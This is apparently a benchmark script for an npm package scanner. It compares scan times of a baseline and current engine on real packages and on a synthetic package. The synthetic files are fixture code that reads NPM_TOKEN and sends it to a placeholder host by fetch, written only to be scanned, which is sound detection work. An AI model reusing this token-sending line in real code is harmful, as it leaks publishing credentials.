'use strict';
// Usage: node bench/deep.cjs /path/to/baseline [package-dir ...]
// Inspected packages are only read. No dependency scripts are executed.
const fs=require('fs'),path=require('path'),os=require('os');
const {performance}=require('perf_hooks');
const before=require(path.join(path.resolve(process.argv[2]),'lib/scanner'));
const after=require('../lib/scanner');
const cache=require('../lib/ast-cache');
const root=fs.mkdtempSync(path.join(os.tmpdir(),'capsurface-bench-'));
fs.writeFileSync(path.join(root,'package.json'),JSON.stringify({name:'benchmark',version:'1'}));
for(let i=0;i<50;i++)fs.writeFileSync(path.join(root,`file-${i}.js`),`const token${i}=process.env.NPM_TOKEN; fetch('https://service.test',{body:token${i}});`);
const cases=[root,...process.argv.slice(3).map(p=>path.resolve(p))];
const output={environment:{node:process.version,cpu:os.cpus()[0].model,platform:process.platform},cases:[],
  caveats:['Three runs per mode; one machine; warm filesystem cache.',
    'Cold means the in-memory AST cache is cleared. Worker startup is included.',
    'Current engine has additional flow models; this is an end-to-end comparison, not equivalent parser work.',
    'No peak process-tree memory measurements.']};
try{
  for(const dir of cases){
    if(!fs.existsSync(path.join(dir,'package.json')))throw Error(`Missing package: ${dir}`);
    const runs={before:[],afterCold:[],afterWarm:[]};const coverage={};let count,complete,version,integrity;
    for(let i=0;i<3;i++){
      for(const mode of (i%2?['afterCold','before']:['before','afterCold'])){
        cache.clear();const start=performance.now();const result=(mode==='before'?before:after).scanPackageDir(dir,{deep:true});
        runs[mode].push(performance.now()-start);count=result.sourceFilesScanned;complete=result.astCoverage.complete;
        if(!count)throw Error(`No source files: ${dir}`);
        coverage[mode]={complete:result.coverage.complete,ast:result.astCoverage};version=result.version;integrity=result.contentIntegrity;
      }
      after.scanPackageDir(dir,{deep:true});const start=performance.now();after.scanPackageDir(dir,{deep:true});runs.afterWarm.push(performance.now()-start);
    }
    const item={name:dir===root?'synthetic-50':path.basename(dir),version,integrity,files:count,astComplete:complete,coverage,samplesMs:runs,
      medianMs:Object.fromEntries(Object.entries(runs).map(([key,values])=>[key,[...values].sort((a,b)=>a-b)[1]]))};
    output.cases.push(item);process.stderr.write(JSON.stringify(item)+'\n');
  }
  process.stdout.write(JSON.stringify(output,null,2)+'\n');
}finally{fs.rmSync(root,{recursive:true,force:true});}
